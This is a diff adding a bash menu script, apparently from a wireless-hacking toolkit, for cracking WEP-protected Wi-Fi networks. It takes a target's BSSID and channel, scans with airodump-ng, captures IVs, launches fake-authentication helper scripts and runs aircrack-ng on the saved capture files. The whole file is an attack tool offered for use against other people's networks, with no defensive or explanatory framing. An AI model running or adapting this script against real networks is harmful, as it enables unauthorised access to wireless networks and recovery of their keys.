@@ -1,0 +1,88 @@
+#! /bin/bash
+echo -e "---------------------------WEP hacking---------------------------"
+if [ ! -z ${WEPB+x} ]
+then
+	echo -e "BSSID: $WEPB"
+else
+	echo -e "Target's BSSID not set"
+fi
+if [ ! -z ${WEPC+x} ]
+then
+	echo -e "Channel: $WEPC"
+else
+	echo -e "Target's channel not set"
+fi
+echo -e " 1) Scan for nearby networks"
+echo -e " 2) Start capturing ivs"
+echo -e " 3) Fakeauth                      If no clients connected"
+echo -e " 4) Fragmentation                 soon"
+echo -e " 5) Chop-chop                     soon"
+echo -e " 6) Aircrack the ivs"
+echo -e "00) Main menu"
+echo -e " 0) EXIT"
+echo -e "Choose: "
+read WEP
+if [ "$WEP" = "1" ]
+then
+	clear
+	airodump-ng wlan0mon
+elif [ "$WEP" = "2" ]
+then
+	WEP=-1
+	echo -e "Enter your target's bssid: "
+	read -e WEPB
+	echo -e "Enter your target's channel: "
+	read -e WEPC
+	echo -e "Enter the name of the file(no extension): "
+	echo -e "(don't use the same name twice)"
+	read -e WEPF
+	WEPFF="/root/handshakes/WEP/$WEPF-01.cap"
+	export WEPB
+	export WEPC
+	export WEPF
+	export WEPFF
+	gnome-terminal -e lh41
+elif [ "$WEP" = "3" ]
+then
+	gnome-terminal -e lh43
+	gnome-terminal -e lh42
+#~ elif [ "$WEP" = "4" ]
+#~ then
+	#~ clear
+#~ elif [ "$WEP" = "5" ]
+#~ then
+	#~ clear
+elif [ "$WEP" = "6" ]
+then
+	aircrack-ng $WEPFF
+elif [ "$WEP" = "0" ]
+then
+	clear
+	exit
+elif [ "$WEP" = "00" ]
+then
+	clear
+	exec bash "$0"
+else 
+	echo -e "I can't do that bro..."
+	sleep 2
+	clear
+	echo -e "Let's try again..."
+	sleep 1
+	exec bash "$0"
+fi
+echo -e "Choose again?(y/n)(Enter=yes): "
+read -e CAG
+if [ "$CAG" = "n" ]
+then
+	clear
+	exit
+else
+	if [ "$WEP" = "1" ]
+		then
+		exec bash "$0"
+	else
+		clear
+		exec bash "$0"
+	fi
+fi
